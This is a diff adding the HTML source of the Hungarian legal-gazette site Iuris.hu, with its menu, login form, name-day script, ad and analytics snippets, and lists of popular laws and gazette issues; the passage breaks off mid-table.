@@ -1,0 +1,936 @@
+<html>
+<head>
+<META NAME="disciption" content="Jogszabály, rendelet, törvény, rendelkezés, joganyag, írányelv, szabály, szabályzat, határozat, egyezmény, utasítás, törvénytervezet, szakvélemény, állásfoglalás, szabályozás, tájékoztató, Adó- és Pénzügyi Ellenõrzési Közlöny, Alkotmánybírósági Határozatok, Bányászati Közlöny, Belügyi Közlöny, Egészségügyi Közlöny, Földmûvelésügyi Közlöny, Gazdasági Közlöny, Határozatok Tára, Honvédelmi Minisztérium, Igazságügyi Minisztérium, Környezetvédelmi és Vízügyi Értesítõ, Hírközlési Értesítõ, Közlekedési Közlöny, Külgazdasági Értesítõ, Kulturális Közlöny, Magyar Közlöny, Munkaügyi Közlöny, Oktatásügyi Közlöny, Statisztikai Közlöny, Szociális Közlöny, Turisztikai Közlöny, Ügyészségi Közlöny, Önkormányzati és Területfejlesztési Minisztérium Egészségügyi Minisztérium Szociális és Munkaügyi Minisztérium, Gazdasági és Közlekedési Minisztérium, Honvédelmi Minisztérium, Igazságügyi és Rendészeti Minisztérium , Környezetvédelmi és Vízügyi Minisztérium, Külügyminisztérium , Oktatási és Kulturális Minisztérium, Pénzügy minisztérium, Földmûvelésügyi és Vidékfejlesztési Minisztérium ">
+<META NAME="keywords" content="Jogszabály, rendelet, törvény, rendelkezés, joganyag, írányelv, szabály, szabályzat, határozat, egyezmény, utasítás, törvénytervezet, szakvélemény, állásfoglalás, szabályozás, tájékoztató, Adó- és Pénzügyi Ellenõrzési Közlöny, Alkotmánybírósági Határozatok, Bányászati Közlöny, Belügyi Közlöny, Egészségügyi Közlöny, Földmûvelésügyi Közlöny, Gazdasági Közlöny, Határozatok Tára, Honvédelmi Minisztérium, Igazságügyi Minisztérium, Környezetvédelmi és Vízügyi Értesítõ, Hírközlési Értesítõ, Közlekedési Közlöny, Külgazdasági Értesítõ, Kulturális Közlöny, Magyar Közlöny, Munkaügyi Közlöny, Oktatásügyi Közlöny, Statisztikai Közlöny, Szociális Közlöny, Turisztikai Közlöny, Ügyészségi Közlöny, Önkormányzati és Területfejlesztési Minisztérium Egészségügyi Minisztérium Szociális és Munkaügyi Minisztérium, Gazdasági és Közlekedési Minisztérium, Honvédelmi Minisztérium, Igazságügyi és Rendészeti Minisztérium , Környezetvédelmi és Vízügyi Minisztérium, Külügyminisztérium , Oktatási és Kulturális Minisztérium, Pénzügy minisztérium, Földmûvelésügyi és Vidékfejlesztési Minisztérium ">
+<title>Iuris.hu - Joga van hozzá! Közlönyök, jogszabályok, törvények</title>
+ <style type="text/css"><!--
+        BODY {
+        background: #E4F1FF;font-family: Verdana, Arial, Helvetica, sans-serif;;font-size: 10px;color: #000066;scrollbar-face-color:#FF982A;scrollbar-highlight-color:#FFFFFF;scrollbar-shadow-color: #479FFE;scrollbar-arrow-color:#E4F1FF;scrollbar-base-color:#FF982A;scrollbar-3dlight-color:#88C0FD; scrollbar-darkshadow-color:#E4F1FF;margin-top: 0px;margin-left: 0px;margin-right: 0px;margin-bottom: 0px;text-decoration: none;font-weight: normal;
+       }
+       table {
+        font-family: Verdana, Arial, Helvetica, sans-serif;;font-size: 10px;color: #000066;scrollbar-face-color:#FF982A;scrollbar-highlight-color:#FFFFFF;scrollbar-shadow-color: #479FFE;scrollbar-arrow-color:#E4F1FF;scrollbar-base-color:#FF982A;scrollbar-3dlight-color:#88C0FD; scrollbar-darkshadow-color:#E4F1FF;margin-top: 0px;margin-left: 0px;margin-right: 0px;margin-bottom: 0px;text-decoration: none;font-weight: normal;
+       }
+ .menutabla {
+	font-size : 10px;
+	font-weight: bold;
+	text-decoration: none;
+	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
+	/*display : block;*/
+	color: #FFFFFF;
+	text-decoration: none;
+	font-weight: bold;
+	height: 14px;
+	cursor: hand;
+}
+.menuurl {
+	color : #014073;
+	font-size : 10px;
+	font-weight: bold;
+	text-decoration: none;
+	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
+	padding-left: 6px;
+	display : block;
+}
+.menuurl:hover {
+	color: #014073;
+}
+.news2 {
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: none;
+	border-bottom-style: solid;
+	border-right-style: none;
+	border-left-style: none;
+	border-bottom-color: E5EEFF;
+}
+a:hover {
+	color: #FF8400;
+	text-decoration: none;
+}
+a {
+	color: #014073;
+	text-decoration: underline;
+}
+.cikkcim {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 11px;
+	font-weight: bold;
+	color: #004173;
+}
+.cikkcim:hover {
+	color: #FF8400;
+	text-decoration: underline;
+}
+.box {
+	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
+	font-size: 11px;
+	color: #014073;
+	text-decoration: none;
+	background-color: #FFFFFF;
+	text-align: left;
+	font-weight: normal;
+	border: 1px solid #A0BBF0;
+	scrollbar-arrow-color:#FF982A;
+	scrollbar-base-color:#E4F1FF;
+	scrollbar-shadow-color: #ADD3FD;
+	scrollbar-face-color:#E4F1FF;
+	scrollbar-highlight-color:#FFFFFF;
+	scrollbar-darkshadow-color:#E4F1FF;
+	scrollbar-3dlight-color:#88C0FD;
+}
+.boxka {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 10px;
+	color: #003366;
+	background-color: #FFFFFF;
+	height: 13px;
+}
+  .forumlink {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 11px;
+	font-weight: bold;
+	color: #004173;
+	text-decoration: underline;
+}
+.forumlink:hover {
+	color: #FF8400;
+	text-decoration: none;
+}
+  .textinput {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 10px;
+	color: #000066;
+	border: 1px solid #014073;
+}
+  .submitgomb {
+	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+                font-weight : bold;
+	color: #014073;
+	text-decoration: none;
+	background-color: #FFFFFF;
+	border: 1px solid #014073;
+}
+  
+       --></style>
+ </head>
+<body onLoad="changevar();">
+ <center><br>
+ <table width=775 border=0 leftmargin=\"0\" topmargin=\"0\" cellspacing=\"0\" cellpadding=\"0\">
+  <tr>
+   <td>
+   <table width=775 border=0 leftmargin=\"0\" topmargin=\"0\" cellspacing=\"0\" cellpadding=\"0\">
+ <tr height=80>
+  <td valign=top background=template/default/skin/header1.jpg width=291>
+   <img src=template/default/skin/blank.gif width=1 height=73>
+
+
+<script language="JavaScript">
+<!--
+function initArray() {
+  this.length = initArray.arguments.length
+  for (var i = 0; i < this.length; i++)
+  this[i+1] = initArray.arguments[i]
+}
+
+/*  Hónap névnapjainak meghatározása */
+
+function havinev(ev,ho,nap) {
+if (ho==1)
+  { var napok = new initArray("Fruzsina","Ábel","Genovéva, Benjámin",
+        "Titusz, Leona","Simon","Boldizsár","Attila, Ramóna","Gyöngyvér","Marcell",
+        "Melánia","Ágota","ErnÕ","Veronika","Bódog","Lóránt, Loránd",
+        "Gusztáv","Antal, Antónia","Piroska","Sára, Márió","Fábián, Sebestyén",
+        "Ágnes","Vince, Artúr","Zelma, Rajmund","Timót","Pál","Vanda, Paula",
+        "Angelika","Károly, Karola","Adél","Martina, Gerda","Marcella","") }
+if (ho==2)
+  if ((ev!=2000) && (ev!=2004) && ev!=1996)
+    { var napok=new initArray("Ignác","Karolina, Aida","Balázs","Ráhel, Csenge",
+        "Ágota, Ingrid","Dorottya, Dóra","Tódor, Rómeó","Aranka","Abigél, Alex","Elvira",
+        "Bertold, Marietta","Lívia, Lídia","Ella, Linda","Bálint, Valentin",
+        "Kolos, Georgina","Julianna, Lilla","Donát","Bernadett","Zsuzsanna",
+        "Aladár, Álmos","Eleonóra","Gerzson","Alfréd",
+        "Mátyás","Géza","Edina","Ákos, Bátor","Elemér","","")  }
+     else
+    { var napok=new initArray("Ignác","Karolina, Aida","Balázs","Ráhel, Csenge",
+        "Ágota, Ingrid","Dorottya, Dóra","Tódor, Rómeó","Aranka","Abigél, Alex","Elvira",
+        "Bertold, Marietta","Lívia, Lídia","Ella, Linda","Bálint, Valentin",
+        "Kolos, Georgina","Julianna, Lilla","Donát","Bernadett","Zsuzsanna",
+        "Aladár, Álmos","Eleonóra","Gerzson","Alfréd",
+        "Szõkõnap","Mátyás","Géza","Edina","Ákos, Bátor","Elemér","","") }
+if (ho==3)
+  { var napok=new initArray("Albin","Lujza","Kornélia","Kázmér","Adorján, Adrián",
+        "Leonóra, Inez","Tamás","Zoltán","Franciska, Fanni","Ildikó",
+        "Szilárd","Gergely","Krisztián, Ajtony","Matild","Kristóf",
+        "Henrietta","Gertrúd, Patrik","Sándor, Ede","József, Bánk","Klaudia",
+        "Benedek","Beáta, Izolda","Emõke","Gábor, Karina","Irén, Irisz",
+        "Emánuel","Hajnalka","Gedeon, Johanna","Auguszta","Zalán","Árpád","" ) }
+if (ho==4)
+  { var napok=new initArray("Hugó","Áron","Buda, Richárd","Izidor","Vince",
+        "Vilmos, Bíborka","Herman","Dénes","Erhard","Zsolt","Leó, Szaniszló","Gyula",
+        "Ida","Tibor","Anasztázia, Tas","Csongor","Rudolf","Andrea, Ilma","Emma",
+        "Tivadar","Konrád","Csilla, Noémi","Béla","György","Márk","Ervin",
+        "Zita","Valéria","Péter","Katalin, Kitti","" )}
+if (ho==5)
+  { var napok=new initArray("Fülöp, Jakab","Zsigmond","Tímea, Irma",
+        "Mónika, Flórián","Györgyi","Ivett, Frida","Gizella","Mihály","Gergely",
+        "Ármin, Pálma","Ferenc","Pongrác","Szervác, Imola","Bonifác","Zsófia, Szonja",
+        "Mózes, Botond","Paszkál","Erik, Alexandra","Ivó, Milán",
+        "Bernát, Felícia","Konstantin","Júlia, Rita","Dezsõ","Eszter, Eliza",
+        "Orbán","Fülöp, Evelin","Hella","Emil, Csanád","Magdolna",
+        "Janka, Zsanett","Angéla, Petronella","" )}
+if (ho==6)
+  { var napok=new initArray("Tünde","Kármen, Anita","Klotild","Bulcsú","Fatime",
+        "Norbert, Cintia","Róbert","Medárd","Félix","Margit, Gréta","Barnabás",
+        "Villõ","Antal, Anett","Vazul","Jolán, Vid","Jusztin","Laura, Alida",
+        "Arnold, Levente","Gyárfás","Rafael","Alajos, Leila","Paulina",
+        "Zoltán","Iván","Vilmos","János, Pál","László","Levente, Irén",
+        "Péter, Pál","Pál","" ) }
+if (ho==7)
+  { var napok=new initArray("Tihamér, Annamária","Ottó","Kornél, Soma","Ulrik",
+        "Emese, Sarolta","Csaba","Appolónia","Ellák","Lukrécia","Amália",
+        "Nóra, Lili","Izabella, Dalma","Jenõ","Õrs, Stella","Henrik, Roland","Valter",
+        "Endre, Elek","Frigyes","Emília","Illés","Dániel, Daniella",
+        "Magdolna","Lenke","Kinga, Kincsõ","Kristóf, Jakab","Anna, Anikó",
+        "Olga, Liliána","Szabolcs","Márta, Flóra","Judit, Xénia","Oszkár","" )}
+if (ho==8)
+  { var napok=new initArray("Boglárka","Lehel","Hermina","Domonkos, Dominika",
+        "Krisztina","Berta, Bettina","Ibolya","László","Emõd","Lörinc",
+        "Zsuzsanna, Tiborc","Klára","Ipoly","Marcell","Mária","Ábrahám",
+        "Jácint","Ilona","Huba","István","Sámuel, Hajna",
+        "Menyhért, Mirjam","Bence","Bertalan","Lajos, Patrícia","Izsó",
+        "Gáspár","Ágoston","Beatrix, Erna","Rózsa","Erika, Bella") }
+if (ho==9)
+  { var napok= new initArray("Egyed, Egon","Rebeka, Dorina","Hilda","Rozália",
+        "Viktor, Lõrinc","Zakariás","Regina","Mária, Adrienn","Ádám","Nikolett, Hunor",
+        "Teodóra","Mária","Kornél","Szeréna, Roxána","Enikõ, Melitta","Edit",
+        "Zsófia","Diána","Vilhelmina","Friderika","Máté, Mirella","Móric",
+        "Tekla","Gellért, Mercédesz","Eufrozina, Kende","Jusztina","Adalbert",
+        "Vencel","Mihály","Jeromos","" )}
+if (ho==10)
+  { var napok= new initArray("Malvin","Petra","Helga","Ferenc","Aurél","Brúnó, Renáta",
+       "Amália","Koppány","Dénes","Gedeon","Brigitta","Miksa","Kálmán, Ede","Helén",
+        "Teréz","Gál","Hedvig","Lukács","Nándor","Vendel","Orsolya","Elõd",
+        "Gyöngyi","Salamon","Blanka, Bianka","Dömötör",
+        "Szabina","Simon, Szimonetta","Nárcisz","Alfonz","Farkas","" )}
+if (ho==11)
+  { var napok=new initArray("Marianna","Achilles","Gyõzõ","Károly","Imre","Lénárd",
+        "Rezsõ","Zsombor","Tivadar","Réka","Márton","Jónás, Renátó","Szilvia",
+        "Aliz","Albert, Lipót","Ödön","Hortenzia, Gergõ","Jenõ","Erzsébet",
+        "Jolán","Olivér","Cecília","Kelemen, Klementina","Emma","Katalin",
+        "Virág","Virgil","Stefánia","Taksony","András, Andor","" )}
+if (ho==12)
+  { var napok=new initArray("Elza","Melinda, Vivien","Ferenc, Olívia","Borbála, Barbara",
+        "Vilma","Miklós","Ambrus","Mária","Natália","Judit","Árpád","Gabriella",
+        "Luca, Otília","Szilárda","Valér","Etelka, Aletta","Lázár, Olimpia",
+        "Auguszta","Viola","Teofil","Tamás","Zéno","Viktória","Ádám, Éva",
+        "Eugénia","István","János","Kamilla",
+        "Tamás, Tamara","Dávid","Szilveszter","") }
+   return napok[nap];
+}
+
+/* Hónap neve */
+function honev(ho) {
+   var month = new initArray("01","02","03","04","05",
+   "06","07","08","09","10","11","12");
+   return month[ho]
+   }
+
+/* Nap neve */
+function napnev(szam) {
+   var napok = new initArray("vasárnap","hétfõ","kedd","szerda","csütörtök",
+                             "péntek","szombat","vasárnap")
+   return napok[szam]
+   }
+
+  var ido = new Date()
+  var ev = ido.getYear()
+  var ho = ido.getMonth()+1
+  var nap = ido.getDate()
+  if (ev<1900) ev+=1900;
+  document.writeln("" + ev + ". " + honev(ho) + ". " + nap + ". "
+    + napnev(ido.getDay()+1)
+    +", "+havinev(ev,ho,nap)+" napja")
+//-->
+</script>
+
+  </td>
+  <td valign=top background=template/default/skin/header2.jpg width=484>
+   <img src=template/default/skin/blank.gif width=1 height=8><br>
+   <img src=template/default/skin/blank.gif width=5 height=1>
+
+  </td>
+ </tr>
+</table>
+
+   <img src=template/default/skin/blank.gif width=1 height=5 border=0><br>
+    <table width=775 border=0 leftmargin=\"0\" topmargin=\"0\" cellspacing=\"0\" cellpadding=\"0\">
+     <tr>
+      <td valign=top>
+      <table width="140" border="0" cellpadding="0" cellspacing="0" background="template/default/skin/menu_03.jpg">
+ <tr> 
+  <td background="template/default/skin/menu_01.jpg" width="140" height="20">
+  </td>
+ </tr>
+ <tr> 
+  <td background="template/default/skin/menu_02.jpg" width="140" height="25"></td>
+ </tr>
+ <tr> 
+  <td>
+   <table width="138" border="0" align="center" cellpadding="0" cellspacing="0" class="news2">
+    <tr class="menukeret">
+     <td class="menutabla" onMouseOver="this.bgColor='#FF8400';" onMouseOut="this.bgColor='#FFFFFF';"><a href="?do=jogszabaly" class="menuurl">Jogszabályok</a></td>
+    </tr>
+    <tr class="menukeret">
+     <td class="menutabla" onMouseOver="this.bgColor='#FF8400';" onMouseOut="this.bgColor='#FFFFFF';"><a href="?do=jogdoktor" class="menuurl">JogDoktor</a></td>
+    </tr>
+    <tr class="menukeret">
+     <td class="menutabla" onMouseOver="this.bgColor='#FF8400';" onMouseOut="this.bgColor='#FFFFFF';"><a href="?do=forum" class="menuurl">Fórum</a></td>
+    </tr>
+    <tr class="menukeret">
+     <td class="menutabla" onMouseOver="this.bgColor='#FF8400';" onMouseOut="this.bgColor='#FFFFFF';"><a href="?do=faq" class="menuurl">Faq</a></td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+ <tr>
+  <td height="7" background="template/default/skin/menu_05.jpg">
+  </td>
+ </tr>
+</table>
+      <img src=\"template/default/skin/blank.gif\" border=0 width=1 height=5>
+      <table width="140" border="0" cellspacing="0" cellpadding="0">
+ <form action="index.php?" method="POST">
+  <tr height=38>
+   <td background="template/default/skin/login_01.jpg" border=0>
+   </td>
+  </tr>
+  <tr height=112>
+   <td background="template/default/skin/login_02.jpg" valign="bottom"><center>
+    <table width="130" border="0" cellspacing="0" cellpadding="0">
+     <tr>
+      <td align="center">
+       <b>Név:
+      </td>
+      <td>
+       <input type="text" name="loginname" size="13"  class="textinput">
+      </td>
+     </tr>
+     <tr>
+      <td align="center">
+       <b>Jelszó:&nbsp;
+      </td>
+      <td>
+       <input type="password" name="loginpass" size="13" class="textinput">
+      </td>
+     </tr>
+     <tr>
+      <td align="right">
+       <input type="checkbox" name="rememberme">
+      </td>
+      <td>
+       <b>Megjegyezzem?
+      </td>
+     </tr>
+    </table>
+	    <input type="hidden" name="login_attempt" value="1">
+	    <input type="image" src="template/default/skin/login_03.jpg" border="0"><br>
+	    <a href=?do=reg><img src="template/default/skin/login_04.jpg" border=0></a><br>
+   </td>
+  </tr>
+  <tr>
+   <td background="template/default/skin/loggedin_04.jpg"><center>
+	    <b><a href=?do=fpass>Elfelejtett jelszó</a></b><br>
+   </td>
+  </tr>
+  <tr height=7>
+   <td background="template/default/skin/login_07.jpg">
+   </td>
+  </tr>
+ </form>
+</table>
+
+      <img src=\"template/default/skin/blank.gif\" border=0 width=1 height=5>
+      <script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-3522381-1";
+urchinTracker();
+</script>
+	  <script language='JavaScript' type='text/javascript' src='http://coversempire.us/banners/adx.js'></script>
+      <script language='JavaScript' type='text/javascript'>
+      <!--
+         if (!document.phpAds_used) document.phpAds_used = ',';
+	    phpAds_random = new String (Math.random()); phpAds_random = phpAds_random.substring(2,11);
+	       
+	       document.write ("<" + "script language='JavaScript' type='text/javascript' src='");
+	          document.write ("http://coversempire.us/banners/adjs.php?n=" + phpAds_random);
+		     document.write ("&amp;clientid=15");
+		        document.write ("&amp;exclude=" + document.phpAds_used);
+			   if (document.referrer)
+			         document.write ("&amp;referer=" + escape(document.referrer));
+				    document.write ("'><" + "/script>");
+				    //-->
+				    </script><noscript><a href='http://coversempire.us/banners/adclick.php?n=a03e3000' target='_blank'><img src='http://coversempire.us/banners/adview.php?clientid=15&amp;n=a03e3000' border='0' alt=''></a></noscript>
+      <img src=\"template/default/skin/blank.gif\" border=0 width=1 height=5>
+      <br>
+<table width="140" border="0" cellspacing="0" cellpadding="0">
+ <tr>
+  <td><center>
+   <html>
+<head>
+       <title></title>
+</head>
+<body>
+
+<!-- APROPIAC.HU box -->
+
+<!--
+color1 - háttér színe
+color2 - szöveg színe
+color3 - lábléc háttér színe
+color4 - lábléc szöveg színe
+color5 - keret vonal színe
+-->
+
+<iframe src="http://www.apropiac.hu/iframe.php?color1=FBFBFB&color2=000000&color3=EFEFEF&color4=336699&color5=CCCCCC" width="125" height="165" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"></iframe>
+
+<!-- APROPIAC.HU box -->
+
+</body>
+</html>
+
+  </td>
+ </tr>
+</table>
+      </td>
+      <td width=5>&nbsp;
+      </td>
+      <td valign=top width=490><center>
+      <style type="text/css">
+<!--
+.style1 {
+	font-size: 9px;
+	font-style: italic;
+}
+.style3 {
+	font-size: 14px;
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+}
+.style4 {font-family: Verdana, Arial, Helvetica, sans-serif}
+.style5 {font-size: 14px}
+-->
+</style>
+<table width="490" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td width="7" height="24" background="template/default/skin/usual_07.jpg"></td>
+          <td height="24" align="right" background="template/default/skin/usual_08.jpg" class="cikkcim">
+           <b>Felhívás</b>
+          </td>
+          <td width="7" height="24" background="template/default/skin/usual_10.jpg"></td>
+        </tr>
+        <tr>
+          <td width="7" background="template/default/skin/usual_11.jpg">
+           <img src="template/default/skin/usual_11.jpg" width="7" height="15">
+          </td>
+          <td bgcolor="#FFFFFF" class="cikktext">
+            <table width="100%" border="0" cellspacing="0" cellpadding="3" class="cikktext">
+             <tr>
+              <td align="center" valign="middle">
+		        <p class="style3">Örömmel értesítünk minden régi és új látogatónkat, hogy oldalunk folyamatos frissülés alatt áll! Hamarosan új arclattal és funciókkal jelentkezünk!</p>
+		        <p class="style4"><span class="style5">Oldalunkon megtalálhatóak:</span><br>
+                  <span class="style1">Jogszabály, rendelet, törvény, rendelkezés, joganyag, írányelv, szabály, szabályzat, határozat, egyezmény, utasítás, törvénytervezet, szakvélemény, állásfoglalás, szabályozás, tájékoztató, Adó- és Pénzügyi Ellenõrzési Közlöny, Alkotmánybírósági Határozatok, Bányászati Közlöny, Belügyi Közlöny, Egészségügyi Közlöny, Földmûvelésügyi Közlöny, Gazdasági Közlöny, Határozatok Tára, Honvédelmi Minisztérium, Igazságügyi Minisztérium, Környezetvédelmi és Vízügyi Értesítõ, Hírközlési Értesítõ, Közlekedési Közlöny, Külgazdasági Értesítõ, Kulturális Közlöny, Magyar Közlöny, Munkaügyi Közlöny, Oktatásügyi Közlöny, Statisztikai Közlöny, Szociális Közlöny, Turisztikai Közlöny, Ügyészségi Közlöny, Önkormányzati és Területfejlesztési Minisztérium Egészségügyi Minisztérium Szociális és Munkaügyi Minisztérium, Gazdasági és Közlekedési Minisztérium, Honvédelmi Minisztérium, Igazságügyi és Rendészeti Minisztérium , Környezetvédelmi és Vízügyi Minisztérium, Külügyminisztérium , Oktatási és Kulturális Minisztérium, Pénzügy minisztérium, Földmûvelésügyi és Vidékfejlesztési Minisztérium </span>
+		        <p class="style3">Iuris.hu
+              </td>
+             </tr>
+            </table>
+          </td>
+          <td width="7" background="template/default/skin/usual_13.jpg">
+           <img src="template/default/skin/usual_13.jpg" width="7" height="18">
+          </td>
+        </tr>
+        <tr>
+          <td width="7" height="7"><img src="template/default/skin/usual_16.jpg" width="7" height="7"></td>
+          <td height="7" background="template/default/skin/usual_17.jpg"><img src="template/default/skin/usual_17.jpg" width="6" height="7"></td>
+          <td width="7" height="7"><img src="template/default/skin/usual_18.jpg" width="7" height="7"></td>
+        </tr>
+</table>
+<img src="template/default/skin/blank.gif" border=0 width=1 height=5><br><table width="490" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td width="7" height="24" background="template/default/skin/usual_07.jpg"></td>
+          <td height="24" align="right" background="template/default/skin/usual_08.jpg" class="cikkcim">
+           <b>Google keresõ</b>
+          </td>
+          <td width="7" height="24" background="template/default/skin/usual_10.jpg"></td>
+        </tr>
+        <tr>
+          <td width="7" background="template/default/skin/usual_11.jpg">
+           <img src="template/default/skin/usual_11.jpg" width="7" height="15">
+          </td>
+          <td bgcolor="#FFFFFF" class="cikktext">
+            <table width="100%" border="0" cellspacing="0" cellpadding="3" class="cikktext">
+             <tr>
+              <td align="center" valign="middle">
+
+<!-- Search Google -->
+<form method="get" action="http://www.google.com/custom" target="_top"><tr><td nowrap="nowrap" valign="middle" align="center" height="32">
+<a href="http://www.google.com/">
+<img src="http://www.google.com/logos/Logo_25wht.gif" alt="Google" hspace="0" vspace="0" border="0" align="middle"></img></a>
+<input type="text" name="q" size="15" maxlength="255" value="" class="textinput"></input>
+<input type="submit" name="sa" value="Keresés" class="submitgomb"></input>
+<input type="hidden" name="client" value="pub-3823072760831267"></input>
+<input type="hidden" name="forid" value="1"></input>
+<input type="hidden" name="ie" value="ISO-8859-2"></input>
+<input type="hidden" name="oe" value="ISO-8859-2"></input>
+<input type="hidden" name="cof" value="GALT:#9A2C06;GL:1;DIV:#33FFFF;VLC:D03500;AH:center;BGC:99CCFF;LBGC:CCE5F9;ALC:440066;LC:440066;T:336699;GFNT:223472;GIMP:223472;FORID:1;"></input>
+<input type="hidden" name="hl" value="hu"></input>
+</td></tr></form>
+<!-- Search Google -->
+
+
+              </td>
+             </tr>
+            </table>
+          </td>
+          <td width="7" background="template/default/skin/usual_13.jpg">
+           <img src="template/default/skin/usual_13.jpg" width="7" height="18">
+          </td>
+        </tr>
+        <tr>
+          <td width="7" height="7"><img src="template/default/skin/usual_16.jpg" width="7" height="7"></td>
+          <td height="7" background="template/default/skin/usual_17.jpg"><img src="template/default/skin/usual_17.jpg" width="6" height="7"></td>
+          <td width="7" height="7"><img src="template/default/skin/usual_18.jpg" width="7" height="7"></td>
+        </tr>
+</table>
+<img src="template/default/skin/blank.gif" border=0 width=1 height=5><br><script>
+ function changevar () {
+  document.flash.SetVariable("_root.prevsearch","1");
+
+  }
+ function changepage (which) {
+  document.flash.SetVariable("_root.switchtothispage",which);
+ }
+</script>
+<table width="490" border="0" cellspacing="0" cellpadding="0">
+ <tr>
+  <td>
+   <table width="490" height="73" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+     <td background="template/default/skin/search_01.jpg" width="82"></td>
+     <td>
+      <table width="408" border="0" cellspacing="0" cellpadding="0">
+       <tr height="35">
+        <td background="template/default/skin/search_02.jpg"></td>
+       </tr>
+       <tr height="38">
+        <td background="template/default/skin/search_03.jpg"></td>
+       </tr>
+      </table>
+     </td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+ <tr>
+  <td background="template/default/skin/search_04.jpg"><center>
+
+<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" id="flash" width="460" height="220">
+<param name="allowScriptAccess" value="always">
+<param name="movie" value="searchbar.swf">
+<param name="quality" value="high">
+<embed src="searchbar.swf" quality="high" width="460" height="220" name="flash" allowScriptAccess="always" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">
+</object>
+
+<br>
+  </td>
+ </tr>
+ <tr>
+  <td background="template/default/skin/search_04.jpg"><center>&nbsp;<br>
+   <img src="template/default/skin/line.jpg" border="0"><p>&nbsp;
+<center>Legnézettebb jogszabályok:<br>
+<br>
+<table width="460" border="0" cellspacing="0" callpadding="0">
+<tr>
+ <td width=30 valign=top align=center>
+  1
+ </td>
+ <td valign=top align=left>
+  <b>Tájékoztató</b><br>a 2007. január 1-jén létrejött regionális közigazgatási hivatalokról
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  2
+ </td>
+ <td valign=top align=left>
+  <b>279/2007. (XII. 11.) KE határozat</b><br>Csaba Gábor rendkívüli és meghatalmazott nagyköveti kinevezésérõl és megbízásáról
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  3
+ </td>
+ <td valign=top align=left>
+  <b>2007. évi CXXI. törvény</b><br>egyes szociális tárgyú törvények módosításáról*
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  4
+ </td>
+ <td valign=top align=left>
+  <b>289/2007. (X. 31.) Korm. rendelet</b><br>a lakossági vezetékes gázfogyasztás és távhõfelhasználás szociális támogatásáról
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  5
+ </td>
+ <td valign=top align=left>
+  <b>A Magyar Köztársaság honvédelmi miniszterének</b><br>pályázati felhívása
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  6
+ </td>
+ <td valign=top align=left>
+  <b>Az Oktatási és Kulturális Minisztérium Támogatáskezelõ Igazgatósága alapító okirata</b><br>Oktatási Minisztérium Alapkezelõ Igazgatósága
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  7
+ </td>
+ <td valign=top align=left>
+  <b>A Szabolcs-Szatmár-Bereg Megyei Mezõgazdasági Szakigazgatási Hivatal</b><br>(4400 Nyíregyháza, Keleti u. 1.)
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  8
+ </td>
+ <td valign=top align=left>
+  <b>Inárcs Község Önkormányzatának egyszerûsített mérlege</b><br>2006.
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  9
+ </td>
+ <td valign=top align=left>
+  <b>Helyesbítés:</b><br>
+ </td>
+</tr>
+
+<tr>
+ <td width=30 valign=top align=center>
+  10
+ </td>
+ <td valign=top align=left>
+  <b>1/2007. (GK. 12.) GKM közlemény</b><br>a mûszaki termékek megfelelõségét vizsgáló, ellenõrzõ és tanúsító szervezetek kijelölésének részletes szabályairól szóló, a 26/2001. (X. 4.) GM és a 75/2004. (I...
+ </td>
+</tr>
+
+
+</table>
+  </td>
+ </tr>
+ <tr height="13">
+  <td background="template/default/skin/search_06.jpg">
+  </td>
+ </tr>
+</table>
+<img src="template/default/skin/blank.gif" border=0 width=1 height=5><br>
+<table width="490" border="0" cellspacing="0" cellpadding="0">
+<tr>
+ <td width="490" height="57" background="template/default/skin/kiadc_02_01.jpg">
+ </td>
+</tr>
+<tr>
+ <td width="490" background="template/default/skin/kiadc_02_02.jpg"><center>
+  <table width="470" border="0" cellspacing="0" cellpadding="0">
+<tr><td>Adó- és Ellen?rzési Értesít?</td>
+<td>/</td></tr>
+<tr><td>Ado- és Penzugyi Ellenorzesi kozlony</td>
+<td>2008/002</td></tr>
+<tr><td>Alkotmanybirosagi hatarozatok</td>
+<td>2008/001</td></tr>
+<tr><td>Banyaszati kozlony</td>
+<td>2007/002</td></tr>
+<tr><td>Belügyi közlöny</td>
+<td>2008/005</td></tr>
+<tr><td>Egeszsegbiztositasi kozlony</td>
+<td>2008/002</td></tr>
+<tr><td>Egeszsegugyi Kozlony</td>
+<td>2008/004</td></tr>
+<tr><td>Foldmuvelesugyi kozlony</td>
+<td>2008/003</td></tr>
+<tr><td>Gazdasagi kozlony</td>
+<td>2008/002</td></tr>
+<tr><td>Hatarozatok tara</td>
+<td>2008/009</td></tr>
+<tr><td>Hirkozlesi ertesito</td>
+<td>2008/002</td></tr>
+<tr><td>Hivatalos ertesito</td>
+<td>2008/001</td></tr>
+<tr><td>Honvedelmi kozlony</td>
+<td>2008/004</td></tr>
+<tr><td>Igazsagugyi kozlony</td>
